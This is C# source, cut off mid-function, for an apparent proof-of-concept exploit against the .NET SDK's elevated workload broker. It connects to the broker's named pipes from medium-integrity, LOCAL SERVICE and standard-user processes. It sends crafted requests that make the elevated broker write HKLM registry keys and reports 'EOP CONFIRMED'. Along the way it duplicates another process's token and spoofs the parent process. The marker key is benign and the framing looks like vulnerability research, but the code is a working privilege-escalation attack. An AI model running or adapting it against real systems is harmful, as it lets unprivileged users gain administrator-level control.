using System.Diagnostics;
using System.IO.Hashing;
using System.IO.Pipes;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;

internal static class Program
{
    private const string MarkerWorkload = "research.pipe-hijack.marker";
    private const string FeatureBand = "10.0.100";

    public static async Task<int> Main(string[] args)
    {
        if (!OperatingSystem.IsWindows())
        {
            Console.WriteLine("WINDOWS_ONLY=True");
            return 0;
        }

        if (args.Length > 0 && args[0] == "attacker")
        {
            if (args.Length >= 4)
            {
                var evidenceWriter = new StreamWriter(args[3], append: true) { AutoFlush = true };
                Console.SetOut(evidenceWriter);
                Console.SetError(evidenceWriter);
            }

            return await RunAttackerAsync(
                serverPid: int.Parse(args[1]),
                expectedParentPid: int.Parse(args[2]),
                sdkMajor: int.Parse(args[4]));
        }

        if (args.Length > 0 && args[0] == "attacker-medium")
        {
            return RunMediumImpersonatedAttacker(
                serverPid: int.Parse(args[1]),
                expectedParentPid: int.Parse(args[2]),
                sdkMajor: int.Parse(args[3]));
        }

        if (args.Length > 0 && args[0] == "ots-helper")
        {
            await Task.Delay(TimeSpan.FromMinutes(2));
            return 0;
        }

        if (args.Length > 0 && args[0] == "ots-attacker")
        {
            var evidenceWriter = new StreamWriter(args[4], append: false) { AutoFlush = true };
            Console.SetOut(evidenceWriter);
            Console.SetError(evidenceWriter);
            Console.WriteLine($"OTS_ATTACKER_SID={WindowsIdentity.GetCurrent().User?.Value}");
            Console.WriteLine($"OTS_ATTACKER_ACCOUNT={WindowsIdentity.GetCurrent().Name}");
            return RunAttackerSync(
                serverPid: int.Parse(args[1]),
                expectedParentPid: int.Parse(args[2]),
                sdkMajor: int.Parse(args[3]),
                requireMediumIntegrity: false);
        }

        if (args.Length > 0 && args[0] == "ots-cross-user")
        {
            return await RunCrossUserOtsAsync(
                standardUserName: args[1],
                standardUserPassword: args[2],
                sdkMajor: int.Parse(args[3]));
        }

        if (args.Length > 0 && args[0] == "ots-cross-sid-service")
        {
            return await RunCrossSidServiceAsync(sdkMajor: int.Parse(args[1]));
        }

        return await RunParentAsync();
    }

    private static async Task<int> RunParentAsync()
    {
        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        bool isAdmin = new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"PARENT_PID={Environment.ProcessId}");
        Console.WriteLine($"PARENT_SID={identity.User?.Value}");
        Console.WriteLine($"PARENT_IS_ADMIN={isAdmin}");
        Console.WriteLine($"DOTNET_PATH={Environment.ProcessPath}");
        Console.WriteLine($"RUNTIME={RuntimeInformation.FrameworkDescription}");

        if (!isAdmin)
        {
            Console.WriteLine("PROBE_SKIPPED_NOT_ADMIN=True");
            return 2;
        }

        string dotnet = Environment.ProcessPath
            ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.");
        string dll = Assembly.GetExecutingAssembly().Location;
        string clientTemp = Path.GetFullPath(Path.GetTempPath()).TrimEnd(Path.DirectorySeparatorChar);
        string selectedSdkVersion = GetSelectedSdkVersion(dotnet);
        int selectedSdkMajor = int.Parse(selectedSdkVersion.Split('.')[0]);
        Console.WriteLine($"SELECTED_SDK_VERSION={selectedSdkVersion}");
        Console.WriteLine($"SELECTED_SDK_MAJOR={selectedSdkMajor}");

        var serverStart = new ProcessStartInfo
        {
            FileName = dotnet,
            Arguments = $"workload elevate --client-temp \"{clientTemp}\"",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };

        using Process server = Process.Start(serverStart)
            ?? throw new InvalidOperationException("Failed to start workload elevate server.");

        Console.WriteLine($"SERVER_PID={server.Id}");

        var attackerStart = new ProcessStartInfo
        {
            FileName = dotnet,
            Arguments = $"\"{dll}\" attacker-medium {server.Id} {Environment.ProcessId} {selectedSdkMajor}",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };

        using Process attacker = Process.Start(attackerStart)
            ?? throw new InvalidOperationException("Failed to start medium-control attacker process.");

        Task<string> attackerOutTask = attacker.StandardOutput.ReadToEndAsync();
        Task<string> attackerErrTask = attacker.StandardError.ReadToEndAsync();

        Task exited = attacker.WaitForExitAsync();
        int attackerExit;
        if (await Task.WhenAny(exited, Task.Delay(TimeSpan.FromSeconds(25))) != exited)
        {
            Console.WriteLine($"MEDIUM_ATTACKER_TIMEOUT_PID={attacker.Id}");
            try { attacker.Kill(entireProcessTree: true); } catch { }
            try { await attacker.WaitForExitAsync().WaitAsync(TimeSpan.FromSeconds(5)); } catch { }
            attackerExit = 124;
        }
        else
        {
            attackerExit = attacker.ExitCode;
        }

        string attackerStdout = await attackerOutTask;
        string attackerStderr = await attackerErrTask;

        Console.WriteLine("=== ATTACKER STDOUT ===");
        Console.Write(attackerStdout);
        Console.WriteLine("=== ATTACKER STDERR ===");
        Console.Write(attackerStderr);
        Console.WriteLine($"ATTACKER_EXIT={attackerExit}");

        if (!server.HasExited)
        {
            if (!server.WaitForExit(5000))
            {
                server.Kill(entireProcessTree: true);
                await server.WaitForExitAsync();
            }
        }

        string serverStdout = await server.StandardOutput.ReadToEndAsync();
        string serverStderr = await server.StandardError.ReadToEndAsync();
        Console.WriteLine("=== SERVER STDOUT ===");
        Console.Write(serverStdout);
        Console.WriteLine("=== SERVER STDERR ===");
        Console.Write(serverStderr);
        Console.WriteLine($"SERVER_EXIT={server.ExitCode}");

        bool confirmed =
            attackerStdout.Contains("ATTACKER_INTEGRITY_SID=S-1-16-8192", StringComparison.Ordinal) &&
            attackerStdout.Contains("ATTACKER_DIRECT_HKLM_WRITE_ALLOWED=False", StringComparison.Ordinal) &&
            attackerStdout.Contains("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
            attackerStdout.Contains("HKLM_MARKER_CREATED=True", StringComparison.Ordinal) &&
            attackerStdout.Contains("HKLM_MARKER_CLEANED=True", StringComparison.Ordinal) &&
            attackerStdout.Contains("ELEVATED_BROKER_MEDIUM_IL_BYPASS=CONFIRMED", StringComparison.Ordinal);

        Console.WriteLine($"SDK_WORKLOAD_PIPE_MEDIUM_IL_EOP={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
        return confirmed ? 0 : 1;
    }

    private static async Task<int> RunAttackerAsync(int serverPid, int expectedParentPid, int sdkMajor)
    {
        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        Console.WriteLine($"EXPECTED_PARENT_PID={expectedParentPid}");
        Console.WriteLine($"ATTACKER_PID={Environment.ProcessId}");
        Console.WriteLine($"ATTACKER_SID={identity.User?.Value}");
        Console.WriteLine($"ATTACKER_DIFFERS_FROM_PARENT={Environment.ProcessId != expectedParentPid}");
        Console.WriteLine($"ATTACKER_INTEGRITY_SID={GetCurrentIntegritySid()}");
        Console.WriteLine($"ATTACKER_IS_ADMIN={new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator)}");

        string architecture = RuntimeInformation.ProcessArchitecture.ToString().ToLowerInvariant();
        string directMarkerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\research.pipe-hijack.direct-attacker";
        bool directWriteAllowed = false;
        try
        {
            using RegistryKey? direct = Registry.LocalMachine.CreateSubKey(directMarkerPath, writable: true);
            directWriteAllowed = direct is not null;
            if (directWriteAllowed)
            {
                Registry.LocalMachine.DeleteSubKeyTree(directMarkerPath, throwOnMissingSubKey: false);
            }
        }
        catch (Exception ex) when (ex is UnauthorizedAccessException or System.Security.SecurityException)
        {
        }
        Console.WriteLine($"ATTACKER_DIRECT_HKLM_WRITE_ALLOWED={directWriteAllowed}");

        Console.WriteLine($"ATTACKER_TARGET_SDK_MAJOR={sdkMajor}");
        string dispatchPipeName = CreatePipeName(serverPid, sdkMajor);
        string logPipeName = CreatePipeName(serverPid, sdkMajor, "log");
        Console.WriteLine($"DISPATCH_PIPE={dispatchPipeName}");
        Console.WriteLine($"LOG_PIPE={logPipeName}");

        using var dispatch = new NamedPipeClientStream(".", dispatchPipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
        using var log = new NamedPipeClientStream(".", logPipeName, PipeDirection.InOut, PipeOptions.Asynchronous);

        try
        {
            dispatch.Connect(5000);
            Console.WriteLine("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True");
        }
        catch (Exception ex) when (ex is TimeoutException or UnauthorizedAccessException or IOException)
        {
            Console.WriteLine($"DISPATCH_PIPE_CONNECT_FAILED={ex.GetType().Name}:{ex.Message}");
            return 3;
        }

        try
        {
            log.Connect(5000);
            Console.WriteLine("LOG_PIPE_CONNECTED_BY_NON_PARENT=True");
        }
        catch (Exception ex) when (ex is TimeoutException or UnauthorizedAccessException or IOException)
        {
            Console.WriteLine($"LOG_PIPE_CONNECT_FAILED={ex.GetType().Name}:{ex.Message}");
            return 3;
        }

        using var logDrainCts = new CancellationTokenSource();
        Task logDrain = DrainLogAsync(log, logDrainCts.Token);

        string markerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\{MarkerWorkload}";

        try
        {
            string writeResponse = await SendRequestAsync(dispatch, new
            {
                WorkloadId = MarkerWorkload,
                RequestType = 400,
                SdkFeatureBand = FeatureBand,
            });
            Console.WriteLine($"WRITE_RESPONSE={writeResponse}");

            bool created = Registry.LocalMachine.OpenSubKey(markerPath) is RegistryKey;
            Console.WriteLine($"HKLM_MARKER_PATH={markerPath}");
            Console.WriteLine($"HKLM_MARKER_CREATED={created}");

            string deleteResponse = await SendRequestAsync(dispatch, new
            {
                WorkloadId = MarkerWorkload,
                RequestType = 401,
                SdkFeatureBand = FeatureBand,
            });
            Console.WriteLine($"DELETE_RESPONSE={deleteResponse}");

            bool cleaned = Registry.LocalMachine.OpenSubKey(markerPath) is null;
            Console.WriteLine($"HKLM_MARKER_CLEANED={cleaned}");

            string shutdownResponse = await SendRequestAsync(dispatch, new { RequestType = 0 });
            Console.WriteLine($"SHUTDOWN_RESPONSE={shutdownResponse}");

            bool confirmed =
                Environment.ProcessId != expectedParentPid &&
                GetCurrentIntegritySid() == "S-1-16-8192" &&
                !directWriteAllowed &&
                created &&
                cleaned;
            Console.WriteLine($"ELEVATED_BROKER_MEDIUM_IL_BYPASS={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
            return confirmed ? 0 : 1;
        }
        finally
        {
            logDrainCts.Cancel();
            try { await logDrain; } catch { }

            // Best-effort cleanup if the delete request did not complete.
            try
            {
                using RegistryKey? parent = Registry.LocalMachine.OpenSubKey(
                    $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}",
                    writable: true);
                parent?.DeleteSubKeyTree(MarkerWorkload, throwOnMissingSubKey: false);
            }
            catch
            {
            }
        }
    }

    private static async Task<string> SendRequestAsync(NamedPipeClientStream pipe, object request)
    {
        byte[] payload = JsonSerializer.SerializeToUtf8Bytes(request);
        byte[] header = BitConverter.GetBytes(payload.Length);
        byte[] framed = new byte[header.Length + payload.Length];
        Buffer.BlockCopy(header, 0, framed, 0, header.Length);
        Buffer.BlockCopy(payload, 0, framed, header.Length, payload.Length);
        // SDK PipeStreamMessageDispatcherBase performs one Read() per named-pipe message,
        // so the length prefix and JSON payload must be emitted as one message.
        await pipe.WriteAsync(framed);
        await pipe.FlushAsync();

        byte[] lengthBytes = new byte[4];
        await ReadExactlyAsync(pipe, lengthBytes);
        int length = BitConverter.ToInt32(lengthBytes, 0);
        if (length < 0 || length > 2044)
        {
            throw new InvalidDataException($"Unexpected response length: {length}");
        }

        byte[] response = new byte[length];
        await ReadExactlyAsync(pipe, response);
        return Encoding.UTF8.GetString(response);
    }

    private static async Task ReadExactlyAsync(Stream stream, byte[] buffer)
    {
        int read = 0;
        while (read < buffer.Length)
        {
            int n = await stream.ReadAsync(buffer.AsMemory(read));
            if (n == 0)
            {
                throw new EndOfStreamException();
            }
            read += n;
        }
    }

    private static async Task DrainLogAsync(Stream stream, CancellationToken cancellationToken)
    {
        byte[] buffer = new byte[4096];
        try
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                int read = await stream.ReadAsync(buffer, cancellationToken);
                if (read == 0)
                {
                    return;
                }
                Console.WriteLine($"LOG_BYTES_DRAINED={read}");
            }
        }
        catch (Exception ex) when (ex is OperationCanceledException or IOException or ObjectDisposedException)
        {
        }
    }


    private static async Task<int> RunCrossSidServiceAsync(int sdkMajor)
    {
        const string LowPrivilegeSid = "S-1-5-19"; // NT AUTHORITY\\LOCAL SERVICE

        string dotnet = Environment.ProcessPath ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.");
        string dll = Assembly.GetExecutingAssembly().Location;
        string workingDirectory = Path.GetDirectoryName(dll) ?? Environment.CurrentDirectory;
        string evidencePath = Path.Combine(workingDirectory, $"cross-sid-evidence-{Guid.NewGuid():N}.txt");

        using WindowsIdentity serverIdentity = WindowsIdentity.GetCurrent();
        string serverSid = serverIdentity.User?.Value ?? throw new InvalidOperationException("Server SID unavailable.");
        bool serverAdmin = new WindowsPrincipal(serverIdentity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"CROSS_SID_SERVER_ACCOUNT={serverIdentity.Name}");
        Console.WriteLine($"CROSS_SID_SERVER_SID={serverSid}");
        Console.WriteLine($"CROSS_SID_SERVER_IS_ADMIN={serverAdmin}");

        IntPtr lowPrivilegeToken = DuplicatePrimaryTokenForSid(LowPrivilegeSid);
        PROCESS_INFORMATION helperPi = default;
        PROCESS_INFORMATION serverPi = default;
        PROCESS_INFORMATION attackerPi = default;
        IntPtr parentHandle = IntPtr.Zero;

        try
        {
            using var lowIdentity = new WindowsIdentity(lowPrivilegeToken);
            string lowSid = lowIdentity.User?.Value ?? throw new InvalidOperationException("Low privilege SID unavailable.");
            Console.WriteLine($"CROSS_SID_LOW_ACCOUNT={lowIdentity.Name}");
            Console.WriteLine($"CROSS_SID_LOW_SID={lowSid}");
            Console.WriteLine($"CROSS_SID_DIFFERENT_IDENTITY={lowSid != serverSid}");

            helperPi = StartProcessWithToken(lowPrivilegeToken, dotnet, $"\"{dll}\" ots-helper", workingDirectory, loadProfile: false);
            int helperPid = checked((int)helperPi.dwProcessId);
            Console.WriteLine($"CROSS_SID_PARENT_PID={helperPid}");

            parentHandle = OpenProcess(OtsProcessCreateProcess | OtsProcessQueryLimitedInformation, false, helperPi.dwProcessId);
            if (parentHandle == IntPtr.Zero)
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess low-SID parent failed");
            }

            serverPi = StartProcessWithExplicitParent(
                parentHandle,
                dotnet,
                $"\"{dotnet}\" workload elevate --client-temp \"{Path.GetTempPath().TrimEnd(Path.DirectorySeparatorChar)}\"",
                workingDirectory);

            int serverPid = checked((int)serverPi.dwProcessId);
            Console.WriteLine($"CROSS_SID_ELEVATED_SERVER_PID={serverPid}");
            await Task.Delay(150);

            attackerPi = StartProcessWithToken(
                lowPrivilegeToken,
                dotnet,
                $"\"{dll}\" ots-attacker {serverPid} {helperPid} {sdkMajor} \"{evidencePath}\"",
                workingDirectory,
                loadProfile: false);

            int attackerPid = checked((int)attackerPi.dwProcessId);
            Console.WriteLine($"CROSS_SID_ATTACKER_PID={attackerPid}");

            using Process attacker = Process.GetProcessById(attackerPid);
            Task exited = attacker.WaitForExitAsync();
            if (await Task.WhenAny(exited, Task.Delay(TimeSpan.FromSeconds(20))) != exited)
            {
                Console.WriteLine("CROSS_SID_ATTACKER_TIMEOUT=True");
                try { attacker.Kill(entireProcessTree: true); } catch { }
                return 124;
            }

            string evidence = File.Exists(evidencePath) ? await File.ReadAllTextAsync(evidencePath) : string.Empty;
            Console.WriteLine("=== CROSS-SID ATTACKER EVIDENCE ===");
            Console.Write(evidence);
            Console.WriteLine($"CROSS_SID_ATTACKER_EXIT={attacker.ExitCode}");

            bool confirmed =
                serverAdmin &&
                lowSid == LowPrivilegeSid &&
                lowSid != serverSid &&
                evidence.Contains($"OTS_ATTACKER_SID={lowSid}", StringComparison.Ordinal) &&
                evidence.Contains("ATTACKER_DIRECT_HKLM_WRITE_ALLOWED=False", StringComparison.Ordinal) &&
                evidence.Contains("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
                evidence.Contains("LOG_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
                evidence.Contains("HKLM_MARKER_CREATED=True", StringComparison.Ordinal) &&
                evidence.Contains("HKLM_MARKER_CLEANED=True", StringComparison.Ordinal) &&
                evidence.Contains("ELEVATED_BROKER_PRIVILEGE_BYPASS=CONFIRMED", StringComparison.Ordinal);

            Console.WriteLine($"SDK_WORKLOAD_PIPE_CROSS_SID_EOP={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
            return confirmed ? 0 : 1;
        }
        finally
        {
            try { if (File.Exists(evidencePath)) File.Delete(evidencePath); } catch { }
            if (attackerPi.hThread != IntPtr.Zero) CloseHandle(attackerPi.hThread);
            if (attackerPi.hProcess != IntPtr.Zero) CloseHandle(attackerPi.hProcess);
            if (serverPi.hProcess != IntPtr.Zero) OtsTerminateProcess(serverPi.hProcess, 0);
            if (serverPi.hThread != IntPtr.Zero) CloseHandle(serverPi.hThread);
            if (serverPi.hProcess != IntPtr.Zero) CloseHandle(serverPi.hProcess);
            if (helperPi.hProcess != IntPtr.Zero) OtsTerminateProcess(helperPi.hProcess, 0);
            if (helperPi.hThread != IntPtr.Zero) CloseHandle(helperPi.hThread);
            if (helperPi.hProcess != IntPtr.Zero) CloseHandle(helperPi.hProcess);
            if (parentHandle != IntPtr.Zero) CloseHandle(parentHandle);
            if (lowPrivilegeToken != IntPtr.Zero) CloseHandle(lowPrivilegeToken);
        }
    }

    private static IntPtr DuplicatePrimaryTokenForSid(string targetSid)
    {
        const uint TokenQuery = 0x0008;
        const uint TokenDuplicate = 0x0002;
        const uint MaximumAllowed = 0x02000000;

        foreach (Process process in Process.GetProcesses())
        {
            IntPtr processHandle = IntPtr.Zero;
            IntPtr token = IntPtr.Zero;
            try
            {
                processHandle = OpenProcess(OtsProcessQueryLimitedInformation, false, checked((uint)process.Id));
                if (processHandle == IntPtr.Zero) continue;
                if (!OpenProcessToken(processHandle, TokenQuery | TokenDuplicate, out token)) continue;

                using var identity = new WindowsIdentity(token);
                if (!string.Equals(identity.User?.Value, targetSid, StringComparison.Ordinal)) continue;

                if (!DuplicateTokenEx(
                    token,
                    MaximumAllowed,
                    IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    TOKEN_TYPE.TokenPrimary,
                    out IntPtr primaryToken))
                {
                    continue;
                }

                Console.WriteLine($"CROSS_SID_TOKEN_SOURCE_PID={process.Id}");
                Console.WriteLine($"CROSS_SID_TOKEN_SOURCE_NAME={process.ProcessName}");
                return primaryToken;
            }
            catch
            {
            }
            finally
            {
                if (token != IntPtr.Zero) CloseHandle(token);
                if (processHandle != IntPtr.Zero) CloseHandle(processHandle);
                process.Dispose();
            }
        }

        throw new InvalidOperationException($"Unable to duplicate a primary token for SID {targetSid}.");
    }
    private static async Task<int> RunCrossUserOtsAsync(string standardUserName, string standardUserPassword, int sdkMajor)
    {
        string dotnet = Environment.ProcessPath ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.");
        string dll = Assembly.GetExecutingAssembly().Location;
        string workingDirectory = Path.GetDirectoryName(dll) ?? Environment.CurrentDirectory;
        string evidencePath = Path.Combine(workingDirectory, $"ots-evidence-{Guid.NewGuid():N}.txt");

        using WindowsIdentity serverIdentity = WindowsIdentity.GetCurrent();
        string serverSid = serverIdentity.User?.Value ?? throw new InvalidOperationException("Server SID unavailable.");
        bool serverAdmin = new WindowsPrincipal(serverIdentity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"OTS_SERVER_ACCOUNT={serverIdentity.Name}");
        Console.WriteLine($"OTS_SERVER_SID={serverSid}");
        Console.WriteLine($"OTS_SERVER_IS_ADMIN={serverAdmin}");

        if (!LogonUserW(standardUserName, ".", standardUserPassword, OtsLogon32LogonInteractive, OtsLogon32ProviderDefault, out IntPtr standardToken))
        {
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "LogonUserW standard user failed");
        }

        PROCESS_INFORMATION helperPi = default;
        PROCESS_INFORMATION serverPi = default;
        PROCESS_INFORMATION attackerPi = default;
        IntPtr parentHandle = IntPtr.Zero;

        try
        {
            using var standardIdentity = new WindowsIdentity(standardToken);
            string standardSid = standardIdentity.User?.Value ?? throw new InvalidOperationException("Standard SID unavailable.");
            Console.WriteLine($"OTS_STANDARD_ACCOUNT={standardIdentity.Name}");
            Console.WriteLine($"OTS_STANDARD_SID={standardSid}");
            Console.WriteLine($"OTS_CROSS_ACCOUNT={standardSid != serverSid}");

            helperPi = StartProcessWithToken(standardToken, dotnet, $"\"{dll}\" ots-helper", workingDirectory);
            int helperPid = checked((int)helperPi.dwProcessId);
            Console.WriteLine($"OTS_PARENT_PID={helperPid}");

            parentHandle = OpenProcess(OtsProcessCreateProcess | OtsProcessQueryLimitedInformation, false, helperPi.dwProcessId);
            if (parentHandle == IntPtr.Zero)
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess parent failed");
            }

            serverPi = StartProcessWithExplicitParent(
                parentHandle,
                dotnet,
                $"\"{dotnet}\" workload elevate --client-temp \"{Path.GetTempPath().TrimEnd(Path.DirectorySeparatorChar)}\"",
                workingDirectory);

            int serverPid = checked((int)serverPi.dwProcessId);
            Console.WriteLine($"OTS_ELEVATED_SERVER_PID={serverPid}");
            await Task.Delay(150);

            attackerPi = StartProcessWithToken(
                standardToken,
                dotnet,
                $"\"{dll}\" ots-attacker {serverPid} {helperPid} {sdkMajor} \"{evidencePath}\"",
                workingDirectory);

            int attackerPid = checked((int)attackerPi.dwProcessId);
            Console.WriteLine($"OTS_ATTACKER_PID={attackerPid}");

            using Process attacker = Process.GetProcessById(attackerPid);
            Task exited = attacker.WaitForExitAsync();
            if (await Task.WhenAny(exited, Task.Delay(TimeSpan.FromSeconds(20))) != exited)
            {
                Console.WriteLine("OTS_ATTACKER_TIMEOUT=True");
                try { attacker.Kill(entireProcessTree: true); } catch { }
                return 124;
            }

            string evidence = File.Exists(evidencePath) ? await File.ReadAllTextAsync(evidencePath) : string.Empty;
            Console.WriteLine("=== OTS ATTACKER EVIDENCE ===");
            Console.Write(evidence);
            Console.WriteLine($"OTS_ATTACKER_EXIT={attacker.ExitCode}");

            bool confirmed =
                serverAdmin &&
                standardSid != serverSid &&
                evidence.Contains($"OTS_ATTACKER_SID={standardSid}", StringComparison.Ordinal) &&
                evidence.Contains("ATTACKER_DIRECT_HKLM_WRITE_ALLOWED=False", StringComparison.Ordinal) &&
                evidence.Contains("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
                evidence.Contains("LOG_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
                evidence.Contains("HKLM_MARKER_CREATED=True", StringComparison.Ordinal) &&
                evidence.Contains("HKLM_MARKER_CLEANED=True", StringComparison.Ordinal) &&
                evidence.Contains("ELEVATED_BROKER_PRIVILEGE_BYPASS=CONFIRMED", StringComparison.Ordinal);

            Console.WriteLine($"SDK_WORKLOAD_PIPE_CROSS_USER_OTS_EOP={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
            return confirmed ? 0 : 1;
        }
        finally
        {
            try { if (File.Exists(evidencePath)) File.Delete(evidencePath); } catch { }
            if (attackerPi.hThread != IntPtr.Zero) CloseHandle(attackerPi.hThread);
            if (attackerPi.hProcess != IntPtr.Zero) CloseHandle(attackerPi.hProcess);
            if (serverPi.hProcess != IntPtr.Zero) OtsTerminateProcess(serverPi.hProcess, 0);
            if (serverPi.hThread != IntPtr.Zero) CloseHandle(serverPi.hThread);
            if (serverPi.hProcess != IntPtr.Zero) CloseHandle(serverPi.hProcess);
            if (helperPi.hProcess != IntPtr.Zero) OtsTerminateProcess(helperPi.hProcess, 0);
            if (helperPi.hThread != IntPtr.Zero) CloseHandle(helperPi.hThread);
            if (helperPi.hProcess != IntPtr.Zero) CloseHandle(helperPi.hProcess);
            if (parentHandle != IntPtr.Zero) CloseHandle(parentHandle);
            CloseHandle(standardToken);
        }
    }

    private static PROCESS_INFORMATION StartProcessWithToken(IntPtr token, string application, string arguments, string workingDirectory, bool loadProfile = true)
    {
        var commandLine = new StringBuilder($"\"{application}\" {arguments}");
        STARTUPINFO si = new() { cb = Marshal.SizeOf<STARTUPINFO>() };
        uint logonFlags = loadProfile ? OtsLogonWithProfile : 0;
        if (!CreateProcessWithTokenW(token, logonFlags, application, commandLine, OtsCreateNoWindow, IntPtr.Zero, workingDirectory, ref si, out PROCESS_INFORMATION pi))
        {
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateProcessWithTokenW cross-user failed");
        }
        return pi;
    }

    private static PROCESS_INFORMATION StartProcessWithExplicitParent(IntPtr parentProcessHandle, string application, string commandLineText, string workingDirectory)
    {
        IntPtr attributeList = IntPtr.Zero;
        IntPtr parentValue = IntPtr.Zero;
        try
        {
            nuint size = 0;
            _ = OtsInitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref size);
            attributeList = Marshal.AllocHGlobal(checked((int)size));
            if (!OtsInitializeProcThreadAttributeList(attributeList, 1, 0, ref size))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "InitializeProcThreadAttributeList failed");
            }

            parentValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(parentValue, parentProcessHandle);
            if (!OtsUpdateProcThreadAttribute(attributeList, 0, (IntPtr)OtsProcThreadAttributeParentProcess, parentValue, (nuint)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "UpdateProcThreadAttribute parent failed");
            }

            OTS_STARTUPINFOEX si = new();
            si.StartupInfo.cb = Marshal.SizeOf<OTS_STARTUPINFOEX>();
            si.lpAttributeList = attributeList;
            var commandLine = new StringBuilder(commandLineText);
            if (!OtsCreateProcessW(application, commandLine, IntPtr.Zero, IntPtr.Zero, false, OtsExtendedStartupInfoPresent | OtsCreateNoWindow, IntPtr.Zero, workingDirectory, ref si, out PROCESS_INFORMATION pi))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateProcessW explicit parent failed");
            }
            return pi;
        }
        finally
        {
            if (attributeList != IntPtr.Zero)
            {
                OtsDeleteProcThreadAttributeList(attributeList);
                Marshal.FreeHGlobal(attributeList);
            }
            if (parentValue != IntPtr.Zero) Marshal.FreeHGlobal(parentValue);
        }
    }
    private static int RunMediumImpersonatedAttacker(int serverPid, int expectedParentPid, int sdkMajor)
    {
        IntPtr mediumImpersonationToken = CreateMediumRestrictedImpersonationToken();
        try
        {
            if (!SetThreadToken(IntPtr.Zero, mediumImpersonationToken))
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "SetThreadToken failed");
            }

            Console.WriteLine("MEDIUM_THREAD_IMPERSONATION_ACTIVE=True");
            return RunAttackerSync(serverPid, expectedParentPid, sdkMajor);
        }
        finally
        {
            RevertToSelf();
            if (mediumImpersonationToken != IntPtr.Zero)
            {
                CloseHandle(mediumImpersonationToken);
            }
        }
    }

    private static int RunAttackerSync(int serverPid, int expectedParentPid, int sdkMajor, bool requireMediumIntegrity = true)
    {
        Console.WriteLine($"EXPECTED_PARENT_PID={expectedParentPid}");
        Console.WriteLine($"ATTACKER_PID={Environment.ProcessId}");
        Console.WriteLine($"ATTACKER_DIFFERS_FROM_PARENT={Environment.ProcessId != expectedParentPid}");
        Console.WriteLine($"ATTACKER_INTEGRITY_SID={GetEffectiveIntegritySid()}");

        string architecture = RuntimeInformation.ProcessArchitecture.ToString().ToLowerInvariant();
        string directMarkerPath = $@"SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\{architecture}\{FeatureBand}\research.pipe-hijack.direct-attacker";

        bool directWriteAllowed = false;
        try
        {
            using RegistryKey? direct = Registry.LocalMachine.CreateSubKey(directMarkerPath, writable: true);
            directWriteAllowed = direct is not null;
            if (directWriteAllowed)
            {
                Registry.LocalMachine.DeleteSubKeyTree(directMarkerPath, throwOnMissingSubKey: false);
            }
        }
        catch (Exception ex) when (ex is UnauthorizedAccessException or System.Security.SecurityException)
        {
        }

        Console.WriteLine($"ATTACKER_DIRECT_HKLM_WRITE_ALLOWED={directWriteAllowed}");

        Console.WriteLine($"ATTACKER_TARGET_SDK_MAJOR={sdkMajor}");
        string dispatchPipeName = CreatePipeName(serverPid, sdkMajor);
        string logPipeName = CreatePipeName(serverPid, sdkMajor, "log");
        Console.WriteLine($"DISPATCH_PIPE={dispatchPipeName}");
        Console.WriteLine($"LOG_PIPE={logPipeName}");

        using var dispatch = new NamedPipeClientStream(".", dispatchPipeName, PipeDirection.InOut, PipeOptions.None);
        using var log = new NamedPipeClientStream(".", logPipeName, PipeDirection.InOut, PipeOptions.None);

        try
        {
            dispatch.Connect(5000);
            Console.WriteLine("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True");
        }
        catch (Exception ex) when (ex is TimeoutException or UnauthorizedAccessException or IOException)
        {
            Console.WriteLine($"DISPATCH_PIPE_CONNECT_FAILED={ex.GetType().Name}:{ex.Message}");
            return 3;
        }

        try
        {
            log.Connect(5000);
